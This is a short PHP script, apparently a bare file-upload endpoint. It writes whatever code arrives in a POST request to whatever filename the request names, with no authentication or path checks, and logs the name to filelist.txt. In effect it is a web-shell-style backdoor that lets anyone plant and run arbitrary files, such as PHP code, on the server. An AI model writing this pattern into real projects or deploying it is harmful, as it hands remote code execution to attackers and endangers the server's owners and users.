<?php
$code = $_POST["code"];
$filename = $_POST["filename"];
print_r($_POST);
file_put_contents($filename, $code);
file_put_contents("filelist.txt",$filename);
?>
